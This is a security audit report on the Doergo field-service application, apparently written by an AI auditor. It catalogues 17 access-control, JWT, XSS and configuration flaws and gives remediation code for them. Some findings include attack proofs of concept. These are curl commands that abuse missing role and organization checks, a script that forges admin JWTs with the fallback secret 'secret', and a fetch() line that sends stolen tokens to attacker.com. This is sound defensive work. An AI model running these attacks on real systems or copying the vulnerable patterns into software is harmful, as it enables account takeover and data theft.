# DOERGO SECURITY AUDIT REPORT

**Date:** 2026-01-15
**Auditor:** Claude Security Analysis
**Scope:** Full application security assessment
**Classification:** CONFIDENTIAL

---

## EXECUTIVE SUMMARY

This security audit identified **17 vulnerabilities** across the Doergo application:

| Severity | Count | Status |
|----------|-------|--------|
| **CRITICAL** | 5 | Requires immediate remediation |
| **HIGH** | 6 | Remediate within 7 days |
| **MEDIUM** | 4 | Remediate within 30 days |
| **LOW** | 2 | Remediate as resources allow |

### Risk Score: **8.5/10 (CRITICAL)**

The most severe issues involve **missing authorization controls** that allow any authenticated user to access or modify data belonging to other organizations.

---

## CRITICAL VULNERABILITIES

### VULN-001: Missing Role-Based Access Control on Task Endpoints
**Severity:** CRITICAL
**CVSS:** 9.1
**File:** `apps/api/gateway/src/modules/tasks/tasks.controller.ts`
**Lines:** 27-110

**Description:**
ALL task endpoints lack `@Roles()` decorators and `@CurrentUser()` injection. Any authenticated user can:
- Create tasks in any organization
- View, update, or delete any task
- Assign tasks (should be DISPATCHER only)
- Change task status

**Proof of Concept:**
```bash
# Login as TECHNICIAN (should only execute assigned tasks)
TOKEN=$(curl -s -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"technician1@example.com","password":"password123"}' | jq -r '.data.accessToken')

# ATTACK: Create task (should be CLIENT only)
curl -X POST http://localhost:4000/api/v1/tasks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title":"Malicious Task","organizationId":"any-org-id"}'
# SUCCESS - No role check!

# ATTACK: Delete any task
curl -X DELETE http://localhost:4000/api/v1/tasks/{any-task-id} \
  -H "Authorization: Bearer $TOKEN"
# SUCCESS - No ownership check!
```

**Remediation:**
```typescript
// tasks.controller.ts - Add role enforcement
import { Roles } from '../../common/decorators';
import { CurrentUser, CurrentUserData } from '../../common/decorators/current-user.decorator';

@Post()
@Roles(Role.CLIENT)
async create(
  @Body() createTaskDto: CreateTaskDto,
  @CurrentUser() user: CurrentUserData,
) {
  return firstValueFrom(
    this.taskClient.send({ cmd: 'create_task' }, {
      ...createTaskDto,
      organizationId: user.organizationId, // Force org from token
      createdById: user.id,
    }),
  );
}

@Patch(':id/assign')
@Roles(Role.DISPATCHER)
async assign(...) { ... }
```

---

### VULN-002: IDOR - Worker Location Data Exposure
**Severity:** CRITICAL
**CVSS:** 8.6
**File:** `apps/api/gateway/src/modules/tracking/tracking.controller.ts`
**Lines:** 31-45

**Description:**
Any authenticated user can access any worker's real-time location by guessing/enumerating worker IDs. No organization boundary enforcement exists.

**Proof of Concept:**
```bash
# Login as CLIENT from Organization A
TOKEN=$(curl -s -X POST http://localhost:4000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"client@example.com","password":"password123"}' | jq -r '.data.accessToken')

# ATTACK: Get worker location from Organization B
curl http://localhost:4000/api/v1/tracking/workers/{org-b-worker-id} \
  -H "Authorization: Bearer $TOKEN"
# Returns: {"lat": 40.7128, "lng": -74.006, "accuracy": 10}
# CRITICAL: Real-time GPS coordinates exposed across organizations!
```

**Remediation:**
```typescript
@Get('workers/:id')
@Roles(Role.DISPATCHER)
async getWorkerLocation(
  @Param('id') id: string,
  @CurrentUser() user: CurrentUserData,
) {
  // Verify worker belongs to user's organization
  const worker = await this.verifyWorkerAccess(id, user.organizationId);
  if (!worker) throw new ForbiddenException('Access denied');

  return firstValueFrom(
    this.trackingClient.send({ cmd: 'get_worker_location' }, { workerId: id }),
  );
}
```

---

### VULN-003: Hardcoded JWT Secret Fallback
**Severity:** CRITICAL
**CVSS:** 9.8
**File:** `apps/api/auth-service/src/app.module.ts`
**Line:** 18

**Description:**
If `JWT_ACCESS_SECRET` environment variable is not set, the application falls back to `'secret'` as the JWT signing key. This allows trivial token forgery.

```typescript
// Current vulnerable code
secret: process.env.JWT_ACCESS_SECRET || 'secret',
```

**Proof of Concept:**
```javascript
// Attacker can forge admin tokens:
const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
  { sub: 'any-user-id', email: 'admin@doergo.com', role: 'DISPATCHER' },
  'secret', // Default fallback
  { expiresIn: '24h' }
);
// Token accepted by application if env var not set
```

**Remediation:**
```typescript
// app.module.ts - Remove fallback, throw on missing secret
JwtModule.register({
  global: true,
  secret: process.env.JWT_ACCESS_SECRET,
  signOptions: { expiresIn: '15m' },
}),

// main.ts - Validate required env vars at startup
if (!process.env.JWT_ACCESS_SECRET) {
  throw new Error('FATAL: JWT_ACCESS_SECRET is required');
}
```

---

### VULN-004: Password Reset Token Logged in Plaintext
**Severity:** CRITICAL
**CVSS:** 8.1
**File:** `apps/api/auth-service/src/modules/auth/auth.service.ts`
**Line:** 363

**Description:**
Password reset tokens are logged in plaintext, enabling complete account takeover if logs are compromised.

```typescript
// CRITICAL: Token logged in production code path
this.logger.log(`Password reset token generated for ${email}: ${resetToken}`);
```

**Remediation:**
```typescript
// Remove token logging entirely - NEVER log secrets
// If debugging needed, log only a truncated hash:
this.logger.debug(`Reset token generated for ${email.substring(0,3)}***`);
```

---

### VULN-005: Weak JWT Secrets in Configuration
**Severity:** CRITICAL
**CVSS:** 9.0
**Files:**
- `apps/api/auth-service/.env` (Lines 9-10)
- `apps/api/gateway/.env` (Line 14)

**Description:**
Default JWT secrets are weak, predictable strings that could be brute-forced:
```
JWT_ACCESS_SECRET=your-super-secret-access-key-change-in-production
JWT_REFRESH_SECRET=your-super-secret-refresh-key-change-in-production
```

**Remediation:**
```bash
# Generate cryptographically secure secrets
node -e "console.log(require('crypto').randomBytes(64).toString('hex'))"
# Output: 128-char hex string (512 bits entropy)
```

---

## HIGH SEVERITY VULNERABILITIES

### VULN-006: XSS via localStorage Token Storage
**Severity:** HIGH
**CVSS:** 7.5
**File:** `apps/web-app/src/lib/api.ts`
**Lines:** 40-56

**Description:**
JWT tokens stored in localStorage are vulnerable to XSS attacks. Any injected script can steal tokens.

```typescript
// Vulnerable storage pattern
const storage = rememberMe ? localStorage : sessionStorage;
storage.setItem(ACCESS_TOKEN_KEY, tokens.accessToken);
storage.setItem(REFRESH_TOKEN_KEY, tokens.refreshToken);
```

**Attack Vector:**
```javascript
// Malicious script injected via XSS or compromised dependency:
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    access: localStorage.getItem('doergo_access_token'),
    refresh: localStorage.getItem('doergo_refresh_token')
  })
});
```

**Remediation:**
- Migrate to HttpOnly cookies with `SameSite=Strict`
- Implement Content Security Policy (CSP)
- Add Subresource Integrity (SRI) for dependencies

---

### VULN-007: No User Context in Task Operations
**Severity:** HIGH
**CVSS:** 7.2
**File:** `apps/api/gateway/src/modules/tasks/tasks.controller.ts`

**Description:**
No `@CurrentUser()` decorator is used in any task endpoint. The gateway doesn't pass authenticated user context to microservices.

**Impact:**
- Tasks created without verified owner
- No audit trail of who performed actions
- Organization boundaries not enforced

---

### VULN-008: Location Spoofing Vulnerability
**Severity:** HIGH
**CVSS:** 7.0
**File:** `apps/api/gateway/src/modules/tracking/tracking.controller.ts`
**Lines:** 15-21

**Description:**
Any authenticated user can update any worker's location without verification.

```typescript
@Post('location')
async updateLocation(@Body() updateLocationDto: UpdateLocationDto) {
  // No check: updateLocationDto.userId === currentUser.id
  return firstValueFrom(
    this.trackingClient.send({ cmd: 'update_location' }, updateLocationDto),
  );
}
```

---

### VULN-009: HTML Injection in Email Templates
**Severity:** HIGH
**CVSS:** 6.8
**File:** `apps/api/notification-service/src/modules/email/email.service.ts`
**Lines:** 36-67

**Description:**
User-controlled data (task title, description) is interpolated directly into HTML emails without escaping.

```typescript
const html = `
  <h2>New Task Created</h2>
  <p><strong>Title:</strong> ${task.title}</p>  // XSS if title contains <script>
  <p><strong>Description:</strong> ${task.description || 'N/A'}</p>
`;
```

**Remediation:**
```typescript
import { escape } from 'he';

const html = `
  <p><strong>Title:</strong> ${escape(task.title)}</p>
`;
```

---

### VULN-010: Missing JTI Blacklist for Token Revocation
**Severity:** HIGH
**CVSS:** 6.5
**File:** `apps/api/auth-service/src/modules/auth/auth.service.ts`
**Lines:** 480-504, 516, 524

**Description:**
JWT tokens include a `jti` (JWT ID) but it's never validated. Compromised access tokens cannot be revoked until expiration.

---

### VULN-011: Swagger API Documentation Exposed
**Severity:** HIGH
**CVSS:** 5.3
**File:** `apps/api/gateway/src/main.ts`
**Lines:** 45-58

**Description:**
Swagger UI available at `/docs` without authentication, exposing full API schema.

---

## MEDIUM SEVERITY VULNERABILITIES

### VULN-012: Missing Input Length Constraints
**Severity:** MEDIUM
**File:** `apps/api/gateway/src/modules/tasks/dto/index.ts`

**Description:**
Task DTOs lack `@MaxLength` validators:
- `title`: No limit (DoS via huge strings)
- `description`: No limit
- `locationAddress`: No limit

---

### VULN-013: Missing HTTPS Enforcement
**Severity:** MEDIUM
**File:** `apps/api/gateway/src/main.ts`

**Description:**
No HTTPS redirect or HSTS headers configured for production.

---

### VULN-014: Microservice Trust Issues
**Severity:** MEDIUM
**Files:** `apps/api/task-service/src/modules/tasks/tasks.controller.ts`

**Description:**
Microservice controllers accept `@Payload() data: any` without re-validation.

---

### VULN-015: Database Credentials in .env
**Severity:** MEDIUM
**File:** `apps/api/auth-service/.env`
**Line:** 2

**Description:**
Database credentials visible in source-controlled .env file.

---

## LOW SEVERITY VULNERABILITIES

### VULN-016: Test Credentials in Console Output
**Severity:** LOW
**File:** `apps/api/auth-service/prisma/seed.ts`

---

### VULN-017: Log Injection via User Email
**Severity:** LOW
**File:** `apps/api/auth-service/src/modules/auth/auth.service.ts`
**Line:** 154

---

## WHAT'S WORKING WELL

| Security Control | Status | Location |
|-----------------|--------|----------|
| Password Hashing (bcrypt, cost 12) | STRONG | auth.service.ts:59 |
| Refresh Token Hashing (SHA-256) | STRONG | auth.service.ts:535 |
| Account Lockout (5 attempts/15 min) | STRONG | auth.service.ts:150 |
| Rate Limiting (3-tier throttling) | STRONG | app.module.ts:22-38 |
| Token Rotation (refresh invalidation) | STRONG | auth.service.ts:277-280 |
| Session Limits (max 5 per user) | STRONG | auth.service.ts:202-209 |
| Input Validation (auth DTOs) | STRONG | dto/index.ts |
| Email Enumeration Prevention | STRONG | auth.service.ts:327-336 |
| Role Injection Prevention | STRONG | auth.service.ts:44 |
| Security Headers (Helmet.js) | GOOD | main.ts:15-20 |

---

## REMEDIATION PRIORITY

### IMMEDIATE (Within 24 Hours)
1. Remove token logging (VULN-004) - 5 minutes
2. Generate new JWT secrets (VULN-005) - 10 minutes
3. Remove hardcoded secret fallback (VULN-003) - 5 minutes

### WEEK 1
4. Add @Roles + @CurrentUser to all task endpoints (VULN-001)
5. Add organization boundary checks (VULN-002)
6. Add role enforcement to tracking endpoints
7. Migrate tokens to HttpOnly cookies (VULN-006)

### WEEK 2
8. Implement JTI blacklist in Redis (VULN-010)
9. Add HTML escaping to email templates (VULN-009)
10. Add length constraints to Task DTOs (VULN-012)

### WEEK 3
11. Implement HTTPS enforcement (VULN-013)
12. Add DTO validation to microservices (VULN-014)
13. Secure Swagger with authentication (VULN-011)

---

## COMPLIANCE GAPS

| Standard | Gap |
|----------|-----|
| OWASP A01:2021 Broken Access Control | VULN-001, VULN-002 |
| OWASP A02:2021 Cryptographic Failures | VULN-003, VULN-005, VULN-006 |
| OWASP A03:2021 Injection | VULN-009, VULN-012 |
| OWASP A07:2021 Auth Failures | VULN-010 |

---

## APPENDIX: ATTACK SURFACE MAP

```
┌─────────────────────────────────────────────────────────────────┐
│                     EXTERNAL ATTACK SURFACE                      │
├─────────────────────────────────────────────────────────────────┤
│ [CRITICAL] /api/v1/tasks/* - No authorization                    │
│ [CRITICAL] /api/v1/tracking/* - IDOR vulnerability               │
│ [HIGH] /docs - API schema exposure                               │
│ [MEDIUM] All endpoints - No HTTPS enforcement                    │
└─────────────────────────────────────────────────────────────────┘
         │
         ▼
┌─────────────────────────────────────────────────────────────────┐
│                     INTERNAL ATTACK SURFACE                      │
├─────────────────────────────────────────────────────────────────┤
│ [CRITICAL] JWT secrets - Weak/predictable                        │
│ [HIGH] localStorage - XSS token theft                            │
│ [MEDIUM] Microservices - Trust without verification              │
└─────────────────────────────────────────────────────────────────┘
```

---

**Report Generated:** 2026-01-15
**Next Audit Recommended:** After remediation of CRITICAL issues
